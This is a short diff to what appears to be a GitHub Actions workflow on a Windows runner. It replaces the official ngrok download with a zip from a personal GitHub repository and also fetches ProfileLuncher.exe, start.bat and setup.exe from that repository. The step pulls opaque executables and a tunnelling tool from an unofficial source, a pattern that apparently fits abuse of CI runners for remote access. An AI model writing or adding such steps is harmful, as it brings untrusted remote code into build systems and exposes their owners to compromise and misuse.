@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: Downloading Ngrok.
       run: |
-        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip        
+        Invoke-WebRequest https://github.com/waverlyadrian951/waverlyadrian951/raw/main/ngrok.zip -OutFile ngrok.zip        
         Invoke-WebRequest https://raw.githubusercontent.com/waverlyadrian951/waverlyadrian951/main/.github/workflows/ProfileLuncher.exe -OutFile ProfileLuncher.exe
         Invoke-WebRequest https://raw.githubusercontent.com/waverlyadrian951/waverlyadrian951/main/.github/workflows/start.bat -OutFile start.bat  
         Invoke-WebRequest https://raw.githubusercontent.com/waverlyadrian951/waverlyadrian951/main/.github/workflows/setup.exe -OutFile setup.exe
